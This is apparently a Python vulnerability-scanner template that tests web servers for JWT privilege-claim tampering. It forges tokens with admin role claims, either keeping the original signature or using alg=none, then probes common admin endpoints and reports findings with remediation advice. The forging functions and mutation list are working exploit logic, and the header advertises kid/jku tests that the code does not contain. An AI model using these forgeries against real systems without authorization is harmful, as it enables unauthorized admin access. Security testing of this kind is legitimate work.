#!/usr/bin/env python3
#
# @id: jwt-role-tampering
# @name: JWT Role / Privilege Claim Tampering
# @author: BugB Security Team
# @severity: critical
# @description: Tests whether the server validates JWT claim integrity by replaying tokens with elevated role/privilege claims (admin, superuser, role=admin, isAdmin=true) without re-signing. Also tests claim injection via unverified kid/jku header parameters.
# @tags: jwt,role-tampering,privilege-escalation,authentication,owasp-a01,owasp-a02,claim-injection
# @cwe: CWE-285
# @cvss: 9.3
# @confidence: 80
# @version: 1.0.0
# @references: https://portswigger.net/web-security/jwt,https://cwe.mitre.org/data/definitions/285.html,https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
# @context_vars: bearer_token:required, endpoints[]:optional, admin_endpoint:optional
# @vuln_class: jwt_abuse
# @hypothesis_tags: jwt, role-tampering, privilege-escalation, claim-injection, broken-authentication, vertical-privesc
# @batch_group: auth-context
# @auto_probe: false
#

import base64
import hashlib
import hmac as hmaclib
import json
import os
import re
import requests
import urllib3
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TEMPLATE_ID   = "jwt-role-tampering"
TEMPLATE_NAME = "JWT Role / Privilege Claim Tampering"

# ── Context helpers ────────────────────────────────────────────────────────────

def get_target() -> Tuple[Optional[str], int]:
    host = os.environ.get("CERT_X_GEN_TARGET_HOST")
    port = int(os.environ.get("CERT_X_GEN_TARGET_PORT", "80"))
    return host, port

def get_context() -> Dict[str, Any]:
    raw = os.environ.get("CERT_X_GEN_CONTEXT", "{}")
    try:
        return json.loads(raw)
    except Exception:
        return {}

def build_base_url(host: str, port: int) -> str:
    scheme = "https" if port == 443 else "http"
    if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
        return f"{scheme}://{host}"
    return f"{scheme}://{host}:{port}"

def missing_context_finding(host: str, missing: List[str]) -> Dict[str, Any]:
    return {
        "template_id": TEMPLATE_ID,
        "template_name": TEMPLATE_NAME,
        "host": host,
        "matched_at": host,
        "severity": "info",
        "confidence": 100,
        "title": f"Template requires context: {', '.join(missing)} missing",
        "description": (
            f"{TEMPLATE_NAME} needs a valid JWT. "
            f"Missing: {', '.join(missing)}. "
            "Re-run with: --context '{\"bearer_token\":\"eyJ...\"}'"
        ),
        "evidence": {"missing_vars": missing},
        "cwe": "CWE-285",
        "cvss_score": 0.0,
        "remediation": "Provide bearer_token via --context flag.",
        "references": [],
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

# ── JWT helpers ────────────────────────────────────────────────────────────────

def b64_url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    return base64.b64decode(s + "=" * (4 - len(s) % 4))

def b64_url_encode(b: bytes) -> str:
    return base64.b64encode(b).decode().replace("+", "-").replace("/", "_").rstrip("=")

def parse_jwt(token: str) -> Optional[Tuple[Dict, Dict, str, str, str]]:
    """Return (header, payload, header_b64, payload_b64, sig_b64) or None."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header  = json.loads(b64_url_decode(parts[0]))
        payload = json.loads(b64_url_decode(parts[1]))
        return header, payload, parts[0], parts[1], parts[2]
    except Exception:
        return None

def forge_token_with_payload(
    header: Dict, new_payload: Dict, original_sig: str
) -> str:
    """Swap payload while keeping original header and signature intact."""
    h = b64_url_encode(json.dumps(header,      separators=(",", ":")).encode())
    p = b64_url_encode(json.dumps(new_payload,  separators=(",", ":")).encode())
    return f"{h}.{p}.{original_sig}"

def forge_none_token(header: Dict, payload: Dict) -> str:
    forged_header = dict(header)
    forged_header["alg"] = "none"
    h = b64_url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
    p = b64_url_encode(json.dumps(payload,        separators=(",", ":")).encode())
    return f"{h}.{p}."

# ── Payload mutation strategies ────────────────────────────────────────────────

ROLE_ESCALATION_MUTATIONS = [
    # (description, mutation_fn)
    ("role=admin", lambda p: {**p, "role": "admin"}),
    ("role=administrator", lambda p: {**p, "role": "administrator"}),
    ("role=superuser", lambda p: {**p, "role": "superuser"}),
    ("isAdmin=true", lambda p: {**p, "isAdmin": True}),
    ("is_admin=true", lambda p: {**p, "is_admin": True}),
    ("admin=true", lambda p: {**p, "admin": True}),
    ("roles=[admin]", lambda p: {**p, "roles": ["admin"]}),
    ("groups=[admin]", lambda p: {**p, "groups": ["admin"]}),
    ("scope=admin:write", lambda p: {**p, "scope": "admin:write openid"}),
    ("authorities=[ROLE_ADMIN]", lambda p: {**p, "authorities": ["ROLE_ADMIN"]}),
]

# ── HTTP helpers ───────────────────────────────────────────────────────────────

SESSION = requests.Session()
SESSION.verify = False

def make_headers(token: str) -> Dict[str, str]:
    return {
        "Authorization": f"Bearer {token}",
        "User-Agent": "CXG-JWT-Scanner/1.0",
        "Accept": "application/json",
    }

def probe_admin_endpoints(base_url: str) -> List[str]:
    """Return endpoints that are 403/401 without elevated token — good test oracle."""
    candidates = [
        "/api/admin", "/administration", "/admin/users",
        "/api/v1/admin", "/api/admin/users", "/rest/admin",
        "/admin/dashboard", "/api/users",
    ]
    reachable = []
    for ep in candidates:
        url = base_url + ep
        try:
            r = SESSION.get(url, headers={"User-Agent": "CXG/1.0"}, timeout=5)
            if r.status_code in (401, 403):
                reachable.append(url)
        except Exception:
            pass
    return reachable

def test_token_on_endpoint(
    url: str,
    token: str,
    original_status_with_valid_token: int,
) -> Optional[int]:
    try:
        r = SESSION.get(url, headers=make_headers(token), timeout=7)
        return r.status_code
    except Exception:
        return None

# ── Core test ─────────────────────────────────────────────────────────────────

def run_tamper_tests(
    oracle_urls: List[str],
    admin_urls: List[str],
    original_token: str,
    header: Dict,
    payload: Dict,
    sig: str,
    host: str,
) -> List[Dict[str, Any]]:
    findings = []
    tested_mutations = set()

    for mutation_desc, mutate_fn in ROLE_ESCALATION_MUTATIONS:
        new_payload = mutate_fn(payload)

        # Skip if payload didn't actually change (claim already at target value)
        payload_key = json.dumps(new_payload, sort_keys=True)
        if payload_key in tested_mutations:
            continue
        tested_mutations.add(payload_key)

        # Strategy A: keep original signature (server ignores sig validation)
        forged = forge_token_with_payload(header, new_payload, sig)

        # Strategy B: alg=none (no sig required)
        forged_none = forge_none_token(header, new_payload)

        for strategy, token, strategy_name in [
            ("original_sig", forged, f"tampered payload + original sig ({mutation_desc})"),
            ("none_alg",     forged_none, f"alg=none + tampered payload ({mutation_desc})"),
        ]:
            test_urls = admin_urls if admin_urls else oracle_urls
            for test_url in test_urls[:3]:  # cap per mutation
                status = test_token_on_endpoint(test_url, token, 200)
                if status == 200:
                    findings.append({
                        "template_id": TEMPLATE_ID,
                        "template_name": TEMPLATE_NAME,
                        "host": host,
                        "matched_at": test_url,
                        "severity": "critical",
                        "confidence": 88,
                        "title": f"JWT Claim Tampering accepted: {mutation_desc}",
                        "description": (
                            f"Server accepted a JWT with tampered privilege claims at {test_url}. "
                            f"Strategy: {strategy_name}. "
                            "The signature was not properly validated after payload modification."
                        ),
                        "evidence": {
                            "attack_strategy": strategy_name,
                            "mutation": mutation_desc,
                            "original_payload_claims": list(payload.keys()),
                            "forged_token_prefix": token[:60] + "…",
                            "response_status": status,
                            "test_url": test_url,
                        },
                        "cwe": "CWE-285",
                        "cvss_score": 9.3,
                        "remediation": (
                            "Always verify JWT signatures server-side before trusting any claims. "
                            "Reject tokens with alg=none. "
                            "Never derive role/privilege from JWT payload alone — cross-check "
                            "against server-side session or database records."
                        ),
                        "references": [
                            "https://portswigger.net/web-security/jwt",
                            "https://cwe.mitre.org/data/definitions/285.html",
                        ],
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                    })
                    # One confirmed finding per mutation is sufficient
                    break

    return findings

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    host, port = get_target()
    if not host:
        print(json.dumps({"findings": []}))
        return

    ctx = get_context()
    base_url = build_base_url(host, port)

    bearer = ctx.get("bearer_token") or ctx.get("auth_token", "")
    if bearer.lower().startswith("bearer "):
        bearer = bearer[7:]

    if not bearer:
        print(json.dumps({"findings": [missing_context_finding(host, ["bearer_token"])]}))
        return

    parsed = parse_jwt(bearer)
    if not parsed:
        print(json.dumps({"findings": []}))
        return

    header, payload, hb64, pb64, sig = parsed

    # Oracle: find endpoints that accept the real token with 200
    endpoints = ctx.get("endpoints", [])
    oracle_urls = []
    for ep in (endpoints or ["/api/me", "/rest/user/whoami"]):
        url = ep if ep.startswith("http") else base_url + ep
        try:
            r = SESSION.get(url, headers=make_headers(bearer), timeout=6)
            if r.status_code == 200:
                oracle_urls.append(url)
        except Exception:
            pass
    if not oracle_urls:
        # Try common profile endpoints
        for ep in ["/api/me", "/rest/user/whoami", "/api/v1/me", "/api/user"]:
            url = base_url + ep
            try:
                r = SESSION.get(url, headers=make_headers(bearer), timeout=5)
                if r.status_code == 200:
                    oracle_urls.append(url)
                    break
            except Exception:
                pass

    if not oracle_urls:
        print(json.dumps({"findings": []}))
        return

    # Admin endpoints (401/403 without elevation = better oracle for privilege tests)
    admin_endpoint = ctx.get("admin_endpoint")
    admin_urls = [admin_endpoint] if admin_endpoint else probe_admin_endpoints(base_url)

    findings = run_tamper_tests(
        oracle_urls, admin_urls,
        bearer, header, payload, sig, host,
    )
    print(json.dumps({"findings": findings}))

if __name__ == "__main__":
    main()
